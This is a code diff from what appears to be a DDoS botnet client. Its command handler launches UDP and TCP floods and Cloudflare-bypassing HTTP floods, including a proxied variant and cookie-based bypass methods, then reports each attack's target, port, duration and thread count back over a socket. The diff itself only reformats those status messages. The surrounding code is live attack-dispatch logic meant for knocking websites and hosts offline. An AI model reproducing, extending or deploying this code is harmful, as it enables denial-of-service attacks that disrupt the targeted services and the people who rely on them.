@@ -1946,11 +1946,31 @@ class Client():
 
                     if method == "udp":
                         threading.Thread(target=runsender, args=(target, por_t, t, thread)).start()
-                        self.sock.send(f"Attack sent successfully\n\n\nAttack Infomation:\nIP: {data[1]}\nPort: {data[2]}\nAttack Method: {str(data[0]).lower()}\nAttack Time: {data[4]}\nThread Amount: {data[3]}\n".encode("ascii"))
+                        self.sock.send(f"""
+Attack sent successfully
+
+
+    -------Attack Infomation-------
+    IP:             \t{data[1]}
+    Port:           \t{data[2]}
+    Attack Method:  \t{str(data[0]).lower()}
+    Attack Time:    \t{data[4]}s
+    Thread Amount:  \t{data[3]}
+""".encode("ascii"))
                     
                     elif method == "tcp":
                         threading.Thread(target=runflooder, args=(target, por_t, t, thread)).start()
-                        self.sock.send(f"Attack sent successfully\n\n\nAttack Infomation:\nIP: {data[1]}\nPort: {data[2]}\nAttack Method: {str(data[0]).lower()}\nAttack Time: {data[4]}\nThread Amount: {data[3]}\n".encode("ascii"))
+                        self.sock.send(f"""
+Attack sent successfully
+
+
+    -------Attack Infomation-------
+    IP:             \t{data[1]}
+    Port:           \t{data[2]}
+    Attack Method:  \t{str(data[0]).lower()}
+    Attack Time:    \t{data[4]}s
+    Thread Amount:  \t{data[3]}
+""".encode("ascii"))
                     
                     else: self.sock.send(f"Invalid Attack Method {method}".encode("ascii"))
 
@@ -1981,24 +2001,63 @@ class Client():
 
 
                     if method == "cfb":
-                        self.sock.send(f"Attack sent successfully\n\n\nAttack Infomation:\nWebsite: {data[1]}\nAttack Method: {str(data[0]).lower()}\nAttack Time: {data[3]}\nThread Amount: {data[2]}\n".encode("ascii"))
+                        self.sock.send(f"""
+Attack sent successfully
+
+
+    -------Attack Infomation-------
+    Target:         \t{data[1]}
+    Attack Method:  \t{str(data[0]).lower()}
+    Attack Time:    \t{data[3]}s
+    Thread Amount:  \t{data[2]}
+""".encode("ascii"))
+                        
                         LaunchCFB(target, thread, t)
                     
                     elif method == "pxcfb":
                         if get_proxies():
-                            self.sock.send(f"Attack sent successfully\n\n\nAttack Infomation:\nWebsite: {data[1]}\nAttack Method: {str(data[0]).lower()}\nAttack Time: {data[3]}\nThread Amount: {data[2]}\n".encode("ascii"))
+                            self.sock.send(f"""
+Attack sent successfully
+
+
+    -------Attack Infomation-------
+    Target:         \t{data[1]}
+    Attack Method:  \t{str(data[0]).lower()}
+    Attack Time:    \t{data[3]}s
+    Thread Amount:  \t{data[2]}
+""".encode("ascii"))
                             LaunchPXCFB(target, thread, t, proxies)
                         else: self.sock.send(f"Failed to get proxies".encode("ascii"))
                     
                     elif method == "cfreq":
                         if get_cookie(target):
-                            self.sock.send(f"Attack sent successfully\n\n\nAttack Infomation:\nWebsite: {data[1]}\nAttack Method: {str(data[0]).lower()}\nAttack Time: {data[3]}\nThread Amount: {data[2]}\n".encode("ascii"))
+                            self.sock.send(f"""
+Attack sent successfully
+
+
+    -------Attack Infomation-------
+    Target:         \t{data[1]}
+    Attack Method:  \t{str(data[0]).lower()}
+    Attack Time:    \t{data[3]}s
+    Thread Amount:  \t{data[2]}
+""".encode("ascii"))
+                            
                             LaunchCFPRO(target, thread, t)
                         else: self.sock.send(f"Failed to bypass cf".encode("ascii"))
                     
                     elif method == "cfsoc":
                         if get_cookie(target):
-                            self.sock.send(f"Attack sent successfully\n\n\nAttack Infomation:\nWebsite: {data[1]}\nAttack Method: {str(data[0]).lower()}\nAttack Time: {data[3]}\nThread Amount: {data[2]}\n".encode("ascii"))
+                            self.sock.send(f"""
+Attack sent successfully
+
+
+    -------Attack Infomation-------
+    Target:         \t{data[1]}
+    Attack Method:  \t{str(data[0]).lower()}
+    Attack Time:    \t{data[3]}s
+    Thread Amount:  \t{data[2]}
+""".encode("ascii"))
+                            
                             LaunchCFSOC(target, thread, t)
                         else: self.sock.send(f"Failed to bypass cf".encode("ascii"))
                     
